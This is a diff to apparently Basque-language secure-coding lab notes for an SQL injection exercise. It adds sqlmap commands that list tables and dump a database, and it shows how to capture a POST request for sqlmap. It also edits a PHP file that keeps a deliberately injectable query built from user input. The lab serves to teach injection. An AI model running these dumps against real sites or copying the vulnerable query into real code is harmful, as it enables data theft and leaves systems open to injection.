@@ -33,7 +33,28 @@ $ python sqlmap.py -u "http://[PATH]/user_info.php?user=1" --batch --tables -D [
 $ python sqlmap.py -u "http://[PATH]/user_info.php?user=1" --batch --dump -T [table] -D [database] 
 
 POST
-[TODO]
+post-request.txt fitxategia sortu: firefox->F12->network->HTML, POST lerroaren gainean: copy request headers eta copy POST data:
+
+***
+POST /workspace/secure-coding/02-Injection/01-loginapp/user_info.php HTTP/1.1
+Host: 3.136.97.33
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
+Accept: ...
+...
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 9
+Origin: http://3.136.97.33
+Connection: keep-alive
+Referer: http://3.136.97.33/workspace/secure-coding/02-Injection/01-loginapp/user_info.html
+Upgrade-Insecure-Requests: 1
+
+user=kkkk
+***
+
+$ python sqlmap.py -r post-request.txt
+$ python sqlmap.py -r post-request.txt --dbs
+...
+
 
 ***********
 
@@ -60,7 +81,9 @@ if ($conn->connect_error) {
 
 // formulariotik bidalitako datuak irakurri
 // leer desde el formulario
-$user =  $_GET['user'];
+
+//$user =  $_GET['user'];
+$user =  $_POST['user'];
 
 //
 $sql = "SELECT * FROM users WHERE user = '$user'";
